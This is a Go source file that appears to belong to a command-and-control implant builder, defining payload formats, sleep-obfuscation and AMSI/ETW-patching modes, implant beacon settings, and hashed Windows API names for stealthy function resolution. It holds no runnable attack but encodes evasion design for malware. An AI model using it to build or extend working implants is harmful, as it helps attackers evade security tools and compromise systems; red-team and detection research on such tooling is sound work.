package Types

const (
	PayloadDir  = "ImplantSource"
	PayloadName = "Agent"
)

const (
	FILETYPE_WINDOWS_EXE            = 1
	FILETYPE_WINDOWS_SERVICE_EXE    = 2
	FILETYPE_WINDOWS_DLL            = 3
	FILETYPE_WINDOWS_REFLECTIVE_DLL = 4
	FILETYPE_WINDOWS_RAW_BINARY     = 5
)

const (
	SLEEPOBF_NO_OBF  = 0
	SLEEPOBF_EKKO    = 1
	SLEEPOBF_ZILEAN  = 2
	SLEEPOBF_FOLIAGE = 3
)

const (
	SLEEPOBF_BYPASS_NONE   = 0
	SLEEPOBF_BYPASS_JMPRAX = 1
	SLEEPOBF_BYPASS_JMPRBX = 2
)

const (
	PROXYLOADING_NONE             = 0
	PROXYLOADING_RTLREGISTERWAIT  = 1
	PROXYLOADING_RTLCREATETIMER   = 2
	PROXYLOADING_RTLQUEUEWORKITEM = 3
)

const (
	AMSIETW_PATCH_NONE   = 0
	AMSIETW_PATCH_HWBP   = 1
	AMSIETW_PATCH_MEMORY = 2
)

const (
	ARCHITECTURE_X64 = 1
	ARCHITECTURE_X86 = 2
	MASM             = 1
	NASM             = 3
	SRC              = 2
)

type BuilderConfig struct {
	Compiler64 string
	Compiler86 string
	Nasm       string
	Masm       string
	DebugDev   bool
	SendLogs   bool
}
type ImplantConfig struct {
	Arch                 int            `json:"Arch"`
	Name                 string         `json:"Name"`
	KillDate             int64          `json:"KillDate"`
	WorkingHours         string         `json:"WorkingHours"`
	HostRotation         string         `json:"HostRotation"`
	ListenerConfig       ListenerConfig `json:"ListenerConfig"`
	JmpType              bool           `json:"JmpType"`
	MemoryEncryptionType string         `json:"MemoryEncryptionType"`
	Format               string         `json:"Format"`
	Sleep                int            `json:"Sleep"`
	Jitter               int            `json:"Jitter"`
}

type AgentBuilder struct {
	BuildSource bool
	SourcePath  string
	RSAKeyPath  string
	Silent      bool

	Payloads []string

	FilesCreated []string

	CompileDir     string
	FileExtenstion string

	FileType int
	ClientId string

	PatchBinary bool

	ProfileConfig struct {
		Original any

		MagicMzX64 string
		MagicMzX86 string

		ImageSizeX64 int
		ImageSizeX86 int

		ReplaceStringsX64 map[string]string
		ReplaceStringsX86 map[string]string
	}

	ImplantConfig ImplantConfig

	ImplantOptions struct {
		Config []byte
	}

	CompilerOptions struct {
		Config BuilderConfig

		SourceDirs  []string
		IncludeDirs []string
		CFlags      []string
		Defines     []string

		Main struct {
			Agent string
			Dll   string
			Exe   string
			Svc   string
		}
	}

	OutputPath string
}

// had to switch this from map to slice because go does not iterate over the keys in an order it does it randomly.
// we need predictablility to parse these in the pe file.
var DllNameHashes = []uint64{
	0xAF6973267322CEF1, //KERNEL32.DLL
	0xD99176CD993A6E6C, //ntdll.dll
}

var ApiNameHashes = []uint64{
	0x27C27F0E9D246F42, //WinHttpOpen 0
	0xEB0E11CDF0F8755D, //WinHttpConnect 1
	0x271EFDAEEC211456, //WinHttpOpenRequest 2
	0x371EFDAEEC1C1D40, //WinHttpSendRequest 3
	0xB34C34E468B2D450, //WinHttpSetOption 4
	0x61B35AE1647C5613, //WinHttpAddRequestHeaders 5
	0x5849BC331DE4F77,  //WinHttpReceiveResponse 6
	0xBC2634B9D6ABC69B, //WinHttpQueryHeaders 7
	0xBBCD1381F969714B, //WinHttpReadData 8
	0xE91AC4AB50E39E3E, //WinHttpCloseHandle 9
	0x934CBF2CB5BA65FE, //RtlGetVersion 10
	0xE7BF643EF6800065, //ZwClose 11
	0x96366A0AA4EA984E, //ZwOpenProcessToken 12
	0x1F25DB60944CF340, //ZwOpenThreadToken 13
	0x306570A980EEDACA, //ZwQueryInformationToken 14
	0x75A514F31871F04A, //RtlAllocateHeap 15
	0x75A4A0B9D2C3F04A, //RtlReAllocateHeap 16
	0xD3B77E4DD8696D61, //RtlRandomEx 17
	0x7416C5FD78F4D55E, //NtGetTickCount 18
	0x5FC99BF0197A7133, //GetAdaptersInfo 19
	0x61EF0CEE5979D62B, //GetUserNameA 20
	0xC89E0CCD2E1EF42B, //GetComputerNameExA 21
	0xDFB3641D9871EFFB, //LocalAlloc 22
	0x9E13641CB4B6622B, //LocalReAlloc 23
	0xCBCA36CC38F7CC65, //LocalFree 24
	0xB22B0F2C5A666505, //LoadLibraryA 25
	0x2B3DEF2C9071F059, //GetProcAddress 26
	0x71DEA6CC38F7CD4F, //GetLocalTime 27
	0x1261F2B90D585BD0, //GetSystemTimeAsFileTime 28
	0x9774D5E616F6E65D, //GetSystemMetrics 29
	0x833DC9DAFB63D357, //RtlCreateTimerQueue 30
	0xED55545CBD30E659, //ZwCreateEvent 31
	0xC51DBF692B44F360, //RtlCaptureContext 32
	0xDB1E978CBD30E657, //RtlCreateTimer 33
	0x6A1D8DC13D39EA44, //RtlRegisterWait 34
	0x833E0AB7BBE3D357, //RtlDeleteTimerQueue 35
	0x6C2F0C759B1FDAA3, //RtlCopyMappedMemory 36
	0x2BD6841BB3E02BB2, //ZwWaitForSingleObject 37
	0x105EBF4CA2AFD251, //ZwSignalAndWaitForSingleObject 38
	0xEBBB4F4DDBE1F819, //ZwContinue 39
	0xDD97B45E9969F828, //ZwSetEvent 40
	0x7F13D52407341A4E, //ZwSetContextThread 41
	0x6EFE64DB3554623C, //ZwDuplicateObject 42
	0x9B2E41BE54366260, //VirtualProtect 43
	0x8231D59A3A04EF1D, //SystemFunction032 44
	0x38B9B8DA106ECFF9, //WaitForSingleObjectEx 45
	0x110F544938E7BE7F, //LdrGetProcedureAddress 46
	0x810CDD966E269A42, //ZwQueryVirtualMemory 47
	0x65067263CD6B0D3D, //BaseThreadInitThunk 48
	0x391E03B20EE79746, //RtlUserThreadStart 49
	0xA267968A9BB2F104, //ZwOpenThread 50
	0x152BD196EC14D617, //ZwAllocateVirtualMemory 51
	0x38881CF2AE25D62E, //ZwProtectVirtualMemory 52
	0x12C236DC472A6662, //ZwCreateThreadEx 53
	0xE809B7DAA4F109D8, //ZwSetInformationVirtualMemory 54
	0x5104B1D621A6042F, //ZwQueryInformationProcess 55
	0x2754BEFE54376655, //ZwOpenProcess 56
	0xB10CDAF22E03E5CB, //ZwReadVirtualMemory 57
	0x810CDB16F023A642, //ZwWriteVirtualMemory 58
	0x3EC66B37CD7D55C3, //ZwCreateUserProcess 59
	0x41A30E514F409A31, //RtlCreateProcessParametersEx 60
	0xE1A6865E9872F2EB, //CreatePipe 61
	0xD9A6364C39690065, //ReadFile 62
	0x6EFE569DFCA8662B, //CreateProcessA 63
	0x6EFE569DFCA86641, //CreateProcessW 64
	0xF73DBE0FCE987352, //GetExitCodeProcess 65
}

var DllNames = []string{
	"advapi32.dll",
	"winhttp.dll",
	"User32.dll",
	"iphlpapi.dll",
	"cryptsp.dll",
	"kernelbase.dll",
}
